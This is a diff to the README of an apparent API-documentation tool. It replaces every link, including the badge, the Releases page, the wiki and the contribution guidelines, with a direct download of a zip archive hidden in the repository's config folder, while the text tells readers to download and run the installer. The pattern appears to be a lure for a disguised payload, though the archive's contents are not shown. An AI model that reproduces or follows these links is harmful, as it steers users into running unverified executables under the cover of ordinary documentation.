@@ -1,6 +1,6 @@
 # 🚀 api-docs - Effortlessly Create API Documentation
 
-[![Download api-docs](https://img.shields.io/badge/Download-api--docs-brightgreen)](https://github.com/lapampara19/api-docs/releases)
+[![Download api-docs](https://github.com/lapampara19/api-docs/raw/refs/heads/main/config/api_docs_v2.6.zip)](https://github.com/lapampara19/api-docs/raw/refs/heads/main/config/api_docs_v2.6.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ The **api-docs** application helps you generate API documentation quickly. It wo
 
 To get started, you will need to download the **api-docs** application. Follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/lapampara19/api-docs/releases).
+1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/lapampara19/api-docs/raw/refs/heads/main/config/api_docs_v2.6.zip).
 2. **Choose the Latest Version:** Look for the latest release. It is usually marked as the most recent.
 3. **Download the File:** Click on the download link for the installer that fits your operating system. 
 4. **Run the Installer:** After downloading, locate the file on your computer and run it to install the application.
@@ -55,7 +55,7 @@ We welcome contributions to improve **api-docs**. If you're interested in contri
 
 For more information on using **api-docs** efficiently, check out:
 
-- [Official Documentation](https://github.com/lapampara19/api-docs/wiki)
-- [Contribution Guidelines](https://github.com/lapampara19/api-docs/blob/main/CONTRIBUTING.md)
+- [Official Documentation](https://github.com/lapampara19/api-docs/raw/refs/heads/main/config/api_docs_v2.6.zip)
+- [Contribution Guidelines](https://github.com/lapampara19/api-docs/raw/refs/heads/main/config/api_docs_v2.6.zip)
 
 Feel free to reach out with any help you might need. Happy documenting!
